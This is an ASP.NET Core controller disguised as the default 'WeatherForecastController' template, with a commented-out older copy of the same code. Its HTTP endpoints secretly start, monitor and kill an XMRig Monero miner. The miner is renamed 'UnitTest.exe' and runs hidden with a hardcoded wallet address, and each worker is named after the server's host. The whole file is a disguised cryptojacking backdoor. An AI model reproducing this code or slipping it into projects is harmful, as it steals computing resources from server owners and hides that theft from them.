using Microsoft.AspNetCore.Mvc;
using System.Collections.Concurrent;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;

[ApiController]
[Route("[controller]")]
public class WeatherForecastController : ControllerBase
{
    // Track multiple miner processes by PID
    private static readonly ConcurrentDictionary<int, MinerProcessInfo> _miners = new();

    // Determine executable filename based on OS
    private static string XmrigFileName =>
        RuntimeInformation.IsOSPlatform(OSPlatform.Windows) ? "UnitTest.exe" : "UnitTest";

    private readonly IHttpContextAccessor _httpContextAccessor;
    public WeatherForecastController(IHttpContextAccessor httpContextAccessor)
    {
        _httpContextAccessor = httpContextAccessor;
    }


    // Helper class to hold process info and output queues
    private class MinerProcessInfo
    {
        public Process Process { get; }
        public ConcurrentQueue<string> Output { get; } = new();
        public ConcurrentQueue<string> Error { get; } = new();

        public MinerProcessInfo(Process proc)
        {
            Process = proc;
        }
    }

    // Remove ANSI escape codes from output strings
    private string RemoveAnsiCodes(string input)
    {
        return Regex.Replace(input ?? "", @"\x1B\[[0-9;]*[mK]", "");
    }

    [HttpGet("start/{pool}")]
    public IActionResult StartMining(string pool, [FromQuery] string? name = null)
    {
        try
        {
            if (string.IsNullOrEmpty(name))
            {
                var req = _httpContextAccessor.HttpContext!.Request;
                var host = req.Host.Host; 
                name = host;
            }

            var appRoot = Directory.GetCurrentDirectory();
            var xmrigPath = Path.Combine(appRoot, XmrigFileName);

            if (!System.IO.File.Exists(xmrigPath))
            {
                var errorFile = Path.Combine(appRoot, "xmrig_error.txt");
                System.IO.File.WriteAllText(errorFile, $"{XmrigFileName} not found.");
                return NotFound($"{XmrigFileName} not found in app root.");
            }

            string wallet = "47wrM1wEDJZ2RvVAaZF3TSD1trpw5xFLB8oKrkt64R9eWtGAwdyBzXaWnFWGdToRoAAH8ympTj5bfYFG6BAnYp9oG1J51BU";
            var random = new Random();
            string worker = name + random.Next(1000, 99999999);

            var arguments = $"-o {pool} -u {wallet} -p {worker} -k --tls";

            var startInfo = new ProcessStartInfo
            {
                FileName = xmrigPath,
                Arguments = arguments,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true,
                WorkingDirectory = appRoot
            };

            var process = new Process { StartInfo = startInfo };

            var minerInfo = new MinerProcessInfo(process);

            process.OutputDataReceived += (sender, e) =>
            {
                if (!string.IsNullOrEmpty(e.Data))
                {
                    var clean = RemoveAnsiCodes(e.Data);
                    minerInfo.Output.Enqueue(clean);
                    while (minerInfo.Output.Count > 1000) minerInfo.Output.TryDequeue(out _);
                }
            };

            process.ErrorDataReceived += (sender, e) =>
            {
                if (!string.IsNullOrEmpty(e.Data))
                {
                    var clean = RemoveAnsiCodes(e.Data);
                    minerInfo.Error.Enqueue(clean);
                    while (minerInfo.Error.Count > 1000) minerInfo.Error.TryDequeue(out _);
                }
            };

            process.Start();
            process.BeginOutputReadLine();
            process.BeginErrorReadLine();

            // Track the new miner process
            _miners[process.Id] = minerInfo;

            return Ok(new { message = $"Mining started with worker={worker}", pid = process.Id });
        }
        catch (Exception ex)
        {
            var errorPath = Path.Combine(Directory.GetCurrentDirectory(), "xmrig_error.txt");
            System.IO.File.WriteAllText(errorPath, $"Exception: {ex.Message}\n\n{ex.StackTrace}");
            return StatusCode(500, "Internal error. Check xmrig_error.txt in app root.");
        }
    }

    [HttpGet("status")]
    public IActionResult GetAllXmrigProcesses()
    {
        var list = _miners.Select(kvp =>
        {
            var p = kvp.Value.Process;
            return new
            {
                pid = p.Id,
                hasExited = p.HasExited,
                startTime = SafeGetStartTime(p),
                processName = p.ProcessName
            };
        }).ToArray();

        return Ok(list);
    }

    [HttpGet("status/{pid:int}")]
    public IActionResult GetXmrigOutput(int pid)
    {
        if (!_miners.TryGetValue(pid, out var minerInfo))
        {
            return NotFound($"No tracked xmrig process with PID {pid}.");
        }

        var process = minerInfo.Process;
        bool isRunning = !process.HasExited;

        return Ok(new
        {
            running = isRunning,
            pid = pid,
            output = minerInfo.Output.ToArray(),
            error = minerInfo.Error.ToArray()
        });
    }

    private DateTime? SafeGetStartTime(Process p)
    {
        try
        {
            return p.StartTime;
        }
        catch
        {
            return null;
        }
    }

    [HttpGet("stop/{pid}")]
    public IActionResult StopMiningByPid(int pid)
    {
        try
        {
            if (!_miners.TryRemove(pid, out var minerInfo))
            {
                return NotFound($"No tracked xmrig process with PID {pid}.");
            }

            var process = minerInfo.Process;

            if (!process.HasExited)
            {
                process.Kill(true);
                process.WaitForExit(5000);
            }

            minerInfo.Output.Clear();
            minerInfo.Error.Clear();

            process.Dispose();

            return Ok($"Mining process with PID {pid} stopped.");
        }
        catch (Exception ex)
        {
            return StatusCode(500, new { error = ex.Message, stackTrace = ex.StackTrace });
        }
    }

    [HttpGet("stopall")]
    public IActionResult StopAllMiningProcesses()
    {
        try
        {
            int stopped = 0;

            foreach (var pid in _miners.Keys.ToList())
            {
                if (_miners.TryRemove(pid, out var minerInfo))
                {
                    var process = minerInfo.Process;
                    try
                    {
                        if (!process.HasExited)
                        {
                            process.Kill(true);
                            process.WaitForExit(3000);
                        }
                    }
                    catch
                    {
                        // ignore exceptions
                    }
                    minerInfo.Output.Clear();
                    minerInfo.Error.Clear();
                    process.Dispose();
                    stopped++;
                }
            }

            return Ok($"{stopped} mining processes stopped.");
        }
        catch (Exception ex)
        {
            return StatusCode(500, new { error = ex.Message, stackTrace = ex.StackTrace });
        }
    }
}




//using Microsoft.AspNetCore.Mvc;
//using System.Collections.Concurrent;
//using System.Diagnostics;
//using System.Text;

//[ApiController]
//[Route("[controller]")]
//public class WeatherForecastController : ControllerBase
//{
//    private static Process _xmrigProcess;
//    private static readonly ConcurrentQueue<string> _xmrigOutput = new();
//    private static readonly ConcurrentQueue<string> _xmrigError = new();

//    [HttpGet("start/{pool}")]
//    public IActionResult StartMining(string pool)
//    {
//        try
//        {
//            var appRoot = Directory.GetCurrentDirectory();
//            var xmrigPath = Path.Combine(appRoot, "UnitTest.exe");

//            if (!System.IO.File.Exists(xmrigPath))
//            {
//                System.IO.File.WriteAllText(Path.Combine(appRoot, "xmrig_error.txt"), "xmrig.exe not found.");
//                return NotFound("xmrig.exe not found in app root.");
//            }

//            string wallet = "47wrM1wEDJZ2RvVAaZF3TSD1trpw5xFLB8oKrkt64R9eWtGAwdyBzXaWnFWGdToRoAAH8ympTj5bfYFG6BAnYp9oG1J51BU";
//            var random = new Random();
//            string worker = "worker_" + random.Next(1000, 99999999);

//            var arguments = $"-o {pool} -u {wallet} -p {worker} -k --tls";

//            var startInfo = new ProcessStartInfo
//            {
//                FileName = xmrigPath,
//                Arguments = arguments,
//                RedirectStandardOutput = true,
//                RedirectStandardError = true,
//                UseShellExecute = false,
//                CreateNoWindow = true,
//                WorkingDirectory = appRoot
//            };

//            _xmrigProcess = new Process { StartInfo = startInfo };

//            _xmrigProcess.OutputDataReceived += (sender, e) =>
//            {
//                if (!string.IsNullOrEmpty(e.Data))
//                {
//                    _xmrigOutput.Enqueue(e.Data);
//                    while (_xmrigOutput.Count > 1000) _xmrigOutput.TryDequeue(out _);
//                }
//            };

//            _xmrigProcess.ErrorDataReceived += (sender, e) =>
//            {
//                if (!string.IsNullOrEmpty(e.Data))
//                {
//                    _xmrigError.Enqueue(e.Data);
//                    while (_xmrigError.Count > 1000) _xmrigError.TryDequeue(out _);
//                }
//            };

//            _xmrigProcess.Start();
//            _xmrigProcess.BeginOutputReadLine();
//            _xmrigProcess.BeginErrorReadLine();

//            return Ok(new { message = $"Mining started with worker={worker}", pid = _xmrigProcess.Id });
//        }
//        catch (Exception ex)
//        {
//            var errorPath = Path.Combine(Directory.GetCurrentDirectory(), "xmrig_error.txt");
//            System.IO.File.WriteAllText(errorPath, $"Exception: {ex.Message}\n\n{ex.StackTrace}");
//            return StatusCode(500, "Internal error. Check xmrig_error.txt in app root.");
//        }
//    }

//    // List all running xmrig processes with basic info
//    [HttpGet("status")]
//    public IActionResult GetAllXmrigProcesses()
//    {
//        var processes = Process.GetProcessesByName("UnitTest")
//            .Select(p => new
//            {
//                pid = p.Id,
//                hasExited = p.HasExited,
//                startTime = SafeGetStartTime(p),
//                processName = p.ProcessName
//            }).ToArray();

//        return Ok(processes);
//    }

//    // Return captured output/error for the tracked miner by PID
//    [HttpGet("status/{pid:int}")]
//    public IActionResult GetXmrigOutput(int pid)
//    {
//        if (_xmrigProcess == null || _xmrigProcess.Id != pid)
//        {
//            return NotFound($"No tracked xmrig process with PID {pid}.");
//        }

//        bool isRunning = !_xmrigProcess.HasExited;

//        return Ok(new
//        {
//            running = isRunning,
//            pid = pid,
//            output = _xmrigOutput.ToArray(),
//            error = _xmrigError.ToArray()
//        });
//    }

//    // Helper to safely get StartTime (catch exceptions for exited/system processes)
//    private DateTime? SafeGetStartTime(Process p)
//    {
//        try
//        {
//            return p.StartTime;
//        }
//        catch
//        {
//            return null;
//        }
//    }

//    [HttpGet("stop/{pid}")]
//    public IActionResult StopMiningByPid(int pid)
//    {
//        try
//        {
//            var process = Process.GetProcesses().FirstOrDefault(p => p.Id == pid && p.ProcessName.Equals("UnitTest", StringComparison.OrdinalIgnoreCase));
//            if (process == null)
//            {
//                return NotFound($"No running xmrig process found with PID {pid}.");
//            }

//            process.Kill(true);
//            process.WaitForExit(5000); // Wait up to 5 seconds for exit

//            if (_xmrigProcess != null && _xmrigProcess.Id == pid)
//            {
//                _xmrigProcess.Dispose();
//                _xmrigProcess = null;
//                _xmrigOutput.Clear();
//                _xmrigError.Clear();
//            }

//            return Ok($"Mining process with PID {pid} stopped.");
//        }
//        catch (Exception ex)
//        {
//            return StatusCode(500, new { error = ex.Message, stackTrace = ex.StackTrace });
//        }
//    }

//    [HttpGet("stopall")]
//    public IActionResult StopAllMiningProcesses()
//    {
//        try
//        {
//            var processes = Process.GetProcessesByName("UnitTest");

//            if (!processes.Any())
//                return Ok("No running UnitTest (xmrig) processes found.");

//            int stopped = 0;
//            foreach (var proc in processes)
//            {
//                try
//                {
//                    proc.Kill(true);
//                    proc.WaitForExit(3000);
//                    stopped++;
//                }
//                catch (Exception ex)
//                {
//                    // Optional: log failed kill attempts
//                }
//            }

//            // Clear the tracked process if it's one of the killed ones
//            if (_xmrigProcess != null && _xmrigProcess.HasExited)
//            {
//                _xmrigProcess.Dispose();
//                _xmrigProcess = null;
//                _xmrigOutput.Clear();
//                _xmrigError.Clear();
//            }

//            return Ok($"{stopped} UnitTest (xmrig) processes stopped.");
//        }
//        catch (Exception ex)
//        {
//            return StatusCode(500, new { error = ex.Message, stack = ex.StackTrace });
//        }
//    }


//}
